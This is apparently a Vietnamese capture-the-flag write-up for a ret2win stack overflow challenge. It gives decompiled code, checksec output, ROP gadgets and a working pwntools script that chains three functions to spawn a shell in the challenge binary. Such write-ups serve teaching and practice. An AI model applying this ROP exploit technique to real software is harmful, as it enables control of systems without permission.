---
title: "Pwn2-MiniCTF-PTITHCM"
date: 2024-01-04 00:00:00 +0700
categories: [CTF, Binary Exploitation]
tags: [pwn, ret2win, rop, stack-overflow, ptithcm]
author: datious
---

# Pwn2-MiniCTF-PTITHCM
Author: D1n0_09_N24DCAT015

*Đầu tiên khi nhìn vô tên file ta có thể nghĩ ngay tới việc return vào hàm win()*
1. Sơ lược về chương trình
    - Ta dùng tool ghidra để xem source code hàm main của chương trình

```
undefined8 main(void)

{
  undefined1 local_18 [16];
  
  printf("Just ret2win ez maybe ChatGPT can solve !!!!!");
  FUN_00401080("%256s",local_18);
  return 0;
}
```
    
- Ta thấy được lỗi buffer overflow ở đây.
- Vì đây là bài ret2win nên tôi sẽ tìm các hàm khác trong chương trình và thấy những hàm sau:

```

void win(int param_1)

{
  if (param_1 == 0x1337) {
    check2 = 0xcafebabe;
  }
  return;
}
void draw(int param_1,int param_2)

{
  if (((param_1 == 0x7331) && (param_2 == -0x789abcdf)) && (check2 == -0x35014542)) {
    check3 = 0x12345678;
  }
  return;
}

void lose(int param_1)

{
  if (((param_1 == -0x21524111) && (check2 == -0x35014542)) && (check3 == 0x12345678)) {
    system("/bin/echo FLAG: PIS{!!!!!!!!!!PWN!!!!!!!!!!}");
    system("sh");
  }
  else {
    system("/bin/echo FLAG: PIS{!!!!!!!!!!PWN!!!!!!!!!!}");
  }
  return;
}

```
=> Qua đây ta có thể thấy luồng tiến đến việc thực thi được lệnh system nhằm lấy quyền điều khiển.
- Tiếp theo ta sẽ check các lớp bảo mật có trong chương trình 
```
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  checksec
[+] checksec for '/home/kali/Downloads/mini/ret2win'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
gef➤  

```
- Canary disable. Vậy hoàn toàn có thể khai thác theo hướng ghi đè save rip để điều khiển luồng chương trình thực thi.

2. Khai thác
        - Bước đầu xác định offset. Dự đoán là 24 bytes sẽ bắt đầu ghi đè save rip.
        ![image](https://hackmd.io/_uploads/ryBhuOQx-l.png)

        
        => Và nó đã ghi đè thành công 
        
- Phân tích các hàm ta thấy cần phải có các gadget để ghi vào nhằm thỏa điều kiện của các hàm.
- Sau khi phân tích ta có luồng như sau: win()->draw()->lose()
- Tìm gadget ta thấy các gadget có thể ghi vào gồm 2 gadget sau:
```
0x000000000040117e : pop rdi ; ret
0x0000000000401180 : pop rsi ; pop rbx ; ret
```
- Hàm win() cần thỏa biến param_1 == 0x1337
- Hàm draw() cần thỏa biến ((param_1 == 0x7331) && (param_2 == -0x789abcdf)) && (check2 == -0x35014542) 
- Hàm lose() cần thỏa ((param_1 == -0x21524111) && (check2 == -0x35014542)) && (check3 == 0x12345678))
=> Đã đủ nguyên liệu để viết script
3. Viết script 


```
#!/usr/bin/python3
from pwn import *
exe=ELF('./ret2win',checksec=False)
p=process(exe.path)
pop_rdi=0x000000000040117e
pop_rsi=0x0000000000401180
ret=0x000000000040101a
input()
gdb.attach(p,gdbscript='''
''')
a=0xdeadbeef                     
b=0x7331    
c=0x87654321   
payload=b'A'*24  
payload+=p64(pop_rdi)+p64(0x1337)
payload+=p64(exe.sym['win'])
payload+=p64(ret)
payload+=p64(pop_rdi)+p64(b)
payload+=p64(pop_rsi)+p64(c)+p64(0x0)
payload+=p64(exe.sym['draw'])
payload+=p64(ret)
payload+=p64(pop_rdi)+p64(0xdeadbeef)
payload+=p64(exe.sym['lose'])
p.sendline(payload)
p.interactive()

```
![image](https://hackmd.io/_uploads/SJNTq_QxZg.png)
Done!
